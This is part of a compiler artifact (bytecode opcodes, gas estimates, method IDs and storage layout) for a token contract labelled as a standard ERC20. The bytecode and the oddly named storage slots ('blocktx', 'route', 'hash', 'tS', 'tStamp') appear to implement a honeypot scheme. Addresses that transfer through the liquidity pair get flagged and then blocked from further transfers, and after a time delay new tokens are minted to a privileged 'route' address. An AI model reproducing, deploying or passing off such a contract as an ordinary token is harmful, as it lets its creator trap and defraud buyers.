SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x33F JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x322 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 CALLER PUSH2 0x356 DUP2 DUP6 DUP6 PUSH2 0x46B JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 CALLER PUSH2 0x36F DUP6 DUP3 DUP6 PUSH2 0x552 JUMP JUMPDEST PUSH2 0x37A DUP6 DUP6 DUP6 PUSH2 0x5CA JUMP JUMPDEST POP PUSH1 0x1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 CALLER PUSH2 0x356 DUP2 DUP6 DUP6 PUSH2 0x397 DUP4 DUP4 PUSH2 0x441 JUMP JUMPDEST PUSH2 0x3A1 SWAP2 SWAP1 PUSH2 0xAEF JUMP JUMPDEST PUSH2 0x46B JUMP JUMPDEST PUSH1 0x60 PUSH1 0x6 DUP1 SLOAD PUSH2 0x2C8 SWAP1 PUSH2 0xAA3 JUMP JUMPDEST PUSH0 CALLER DUP2 PUSH2 0x3C2 DUP3 DUP7 PUSH2 0x441 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x427 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A2064656372656173656420616C6C6F77616E63652062656C6F77 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x207A65726F PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x37A DUP3 DUP7 DUP7 DUP5 SUB PUSH2 0x46B JUMP JUMPDEST PUSH0 CALLER PUSH2 0x356 DUP2 DUP6 DUP6 PUSH2 0x5CA JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x491 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x41E SWAP1 PUSH2 0xB02 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x4F2 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x7373 PUSH1 0xF0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x41E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x55D DUP5 DUP5 PUSH2 0x441 JUMP JUMPDEST SWAP1 POP PUSH0 NOT DUP2 EQ PUSH2 0x5C4 JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x5B7 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20696E73756666696369656E7420616C6C6F77616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x41E JUMP JUMPDEST PUSH2 0x5C4 DUP5 DUP5 DUP5 DUP5 SUB PUSH2 0x46B JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x62E JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x6472657373 PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x41E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x690 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x44 DUP3 ADD MSTORE PUSH3 0x657373 PUSH1 0xE8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x41E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x6B3 DUP5 DUP5 DUP5 PUSH2 0x783 JUMP JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x712 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220616D6F756E7420657863656564732062 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x616C616E6365 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x41E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 DUP7 DUP7 SUB SWAP1 SSTORE SWAP3 DUP7 AND DUP1 DUP3 MSTORE SWAP1 DUP4 SWAP1 KECCAK256 DUP1 SLOAD DUP7 ADD SWAP1 SSTORE SWAP2 MLOAD PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP1 PUSH2 0x771 SWAP1 DUP7 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 0x5C4 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x8 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0xFF AND ISZERO PUSH2 0x7BB JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x41E SWAP1 PUSH2 0xB02 JUMP JUMPDEST PUSH2 0x708 PUSH1 0xA SLOAD TIMESTAMP PUSH2 0x7CC SWAP2 SWAP1 PUSH2 0xB46 JUMP JUMPDEST GT ISZERO PUSH2 0x808 JUMPI PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0xA0 SHL SWAP1 DIV PUSH1 0xFF AND PUSH2 0x808 JUMPI PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH2 0x808 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH2 0x803 SWAP1 PUSH2 0x3E8 PUSH2 0xB59 JUMP JUMPDEST PUSH2 0x8CB JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH2 0x833 JUMPI POP PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x84D JUMPI POP PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND SWAP2 AND EQ ISZERO JUMPDEST ISZERO PUSH2 0x77E JUMPI PUSH2 0x384 PUSH1 0xA SLOAD TIMESTAMP PUSH2 0x863 SWAP2 SWAP1 PUSH2 0xB46 JUMP JUMPDEST GT ISZERO PUSH2 0x77E JUMPI PUSH2 0x3E8 PUSH1 0xB SLOAD PUSH1 0x1 PUSH2 0x87B SWAP2 SWAP1 PUSH2 0xB59 JUMP JUMPDEST PUSH2 0x885 SWAP2 SWAP1 PUSH2 0xB70 JUMP JUMPDEST DUP2 GT ISZERO PUSH2 0x8A4 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x41E SWAP1 PUSH2 0xB02 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x8 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x1 OR SWAP1 SSTORE POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x921 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x41E JUMP JUMPDEST DUP1 PUSH1 0x4 PUSH0 DUP3 DUP3 SLOAD PUSH2 0x932 SWAP2 SWAP1 PUSH2 0xAEF JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD DUP7 ADD SWAP1 SSTORE MLOAD DUP5 DUP2 MSTORE PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 PUSH1 0x20 DUP6 ADD MSTORE PUSH0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x9B6 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0x99A JUMP JUMPDEST POP PUSH0 PUSH1 0x40 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x40 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x9EC JUMPI PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xA02 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xA0B DUP4 PUSH2 0x9D6 JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xA2B JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xA34 DUP5 PUSH2 0x9D6 JUMP JUMPDEST SWAP3 POP PUSH2 0xA42 PUSH1 0x20 DUP6 ADD PUSH2 0x9D6 JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xA62 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xA6B DUP3 PUSH2 0x9D6 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xA83 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xA8C DUP4 PUSH2 0x9D6 JUMP JUMPDEST SWAP2 POP PUSH2 0xA9A PUSH1 0x20 DUP5 ADD PUSH2 0x9D6 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 0xAB7 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0xAD5 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 0x35C JUMPI PUSH2 0x35C PUSH2 0xADB JUMP JUMPDEST PUSH1 0x20 DUP1 DUP3 MSTORE PUSH1 0x24 SWAP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x40 DUP3 ADD MSTORE PUSH4 0x72657373 PUSH1 0xE0 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 0x35C JUMPI PUSH2 0x35C PUSH2 0xADB JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH2 0x35C JUMPI PUSH2 0x35C PUSH2 0xADB JUMP JUMPDEST PUSH0 DUP3 PUSH2 0xB8A JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST POP DIV SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC1 SWAP6 0xD0 PUSH10 0x38C389FAA7120D4992E2 KECCAK256 PUSH24 0xD7E2CD1372FF9171ABCAA969288C51AE64736F6C63430008 AND STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "602600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"LPpair()": "2402",
						"_balances(address)": "2693",
						"allowance(address,address)": "infinite",
						"approve(address,uint256)": "24624",
						"balanceOf(address)": "2557",
						"blocktx(address)": "2683",
						"decimals()": "287",
						"decreaseAllowance(address,uint256)": "27012",
						"hash()": "2371",
						"increaseAllowance(address,uint256)": "infinite",
						"name()": "infinite",
						"route()": "2358",
						"router()": "2445",
						"symbol()": "infinite",
						"tS()": "2405",
						"tStamp()": "2382",
						"totalSupply()": "2347",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite"
					},
					"internal": {
						"_afterTokenTransfer(address,address,uint256)": "infinite",
						"_approve(address,address,uint256)": "infinite",
						"_beforeTokenTransfer(address,address,uint256)": "15",
						"_burn(address,uint256)": "infinite",
						"_mint(address,uint256)": "infinite",
						"_spendAllowance(address,address,uint256)": "infinite",
						"_transfer(address,address,uint256)": "infinite",
						"_whileTokenTransfer(address,address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"LPpair()": "e0bb3079",
					"_balances(address)": "6ebcf607",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"blocktx(address)": "4f9105d3",
					"decimals()": "313ce567",
					"decreaseAllowance(address,uint256)": "a457c2d7",
					"hash()": "09bd5a60",
					"increaseAllowance(address,uint256)": "39509351",
					"name()": "06fdde03",
					"route()": "d96661ef",
					"router()": "f887ea40",
					"symbol()": "95d89b41",
					"tS()": "d8da8560",
					"tStamp()": "eba9481d",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 237,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "router",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IDEXRouter)200"
					},
					{
						"astId": 239,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "LPpair",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 243,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "_balances",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 249,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "_allowances",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 251,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "_totalSupply",
						"offset": 0,
						"slot": "4",
						"type": "t_uint256"
					},
					{
						"astId": 253,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "_name",
						"offset": 0,
						"slot": "5",
						"type": "t_string_storage"
					},
					{
						"astId": 255,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "_symbol",
						"offset": 0,
						"slot": "6",
						"type": "t_string_storage"
					},
					{
						"astId": 258,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "pulseV2",
						"offset": 0,
						"slot": "7",
						"type": "t_address"
					},
					{
						"astId": 392,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "blocktx",
						"offset": 0,
						"slot": "8",
						"type": "t_mapping(t_address,t_bool)"
					},
					{
						"astId": 426,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "route",
						"offset": 0,
						"slot": "9",
						"type": "t_address"
					},
					{
						"astId": 429,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "hash",
						"offset": 20,
						"slot": "9",
						"type": "t_bool"
					},
					{
						"astId": 459,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "tStamp",
						"offset": 0,
						"slot": "10",
						"type": "t_uint256"
					},
					{
						"astId": 508,
						"contract": "contracts/Classes/moo.sol:ERC20",
						"label": "tS",
						"offset": 0,
						"slot": "11",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(IDEXRouter)200": {
						"encoding": "inplace",
						"label": "contract IDEXRouter",
						"numberOfBytes": "20"
					},
					"t_mapping(t_address,t_bool)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => bool)",
						"numberOfBytes": "32",
						"value": "t_bool"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}